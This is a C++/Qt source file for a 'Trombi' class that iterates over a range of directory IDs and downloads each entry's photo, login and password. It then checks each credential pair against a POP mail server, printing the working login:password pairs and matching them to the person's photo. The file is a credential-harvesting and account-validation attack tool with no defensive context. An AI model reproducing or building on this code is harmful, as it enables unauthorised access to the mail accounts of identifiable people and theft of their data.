#include "trombi.h"

#include <QTextStream>

Trombi::Trombi(const QString &host, quint16 port, bool dump, int firstId, int lastId, QObject *parent) :
    QObject(parent), host(host), port(port), dump(dump), firstId(firstId), lastId(lastId), currentId(firstId)
{
}

void Trombi::searchEntries()
{
    emit minMaxChanged(firstId, lastId);
    startNextDownload();
}

void Trombi::startNextDownload()
{
    Entry *entry = new Entry(currentId, this);
    connect (entry, SIGNAL(ready()),
             SLOT(entryReady()));
}

void Trombi::entryReady()
{
    emit progressChanged(currentId);
    currentId++;
    Entry *entry = qobject_cast<Entry*>(sender());
    if(entry->isValid())
    {
        if (!entry->getPixmap().isNull())
            emit entryFound(entry->getPixmap());

        if (!entry->getPasswd().isEmpty())
        {
            PopChecker *checker = new PopChecker(host, port, entry->getLogin(), entry->getPasswd(), this);
            currentChecks.insert(checker, entry);
            connect(checker, SIGNAL(checkFinished(bool)),
                    SLOT(popCheckFinished(bool)));
            checker->check();
        }
        else
        {
            entry->deleteLater();
        }
    }
    else
    {
        entry->deleteLater();
    }
    if (currentId < lastId)
        startNextDownload();
}

void Trombi::popCheckFinished(bool valid)
{
    PopChecker *checker = qobject_cast<PopChecker*>(sender());
    Entry *entry = currentChecks.take(checker);

    if (valid)
    {
        if (dump)
            QTextStream(stdout) << entry->getLogin() << ":" << entry->getPasswd() << endl;
        if (!entry->getPixmap().isNull())
            emit matchFound(entry->getPixmap(), entry->getLogin(), entry->getPasswd());
    }

    checker->deleteLater();
    entry->deleteLater();
}
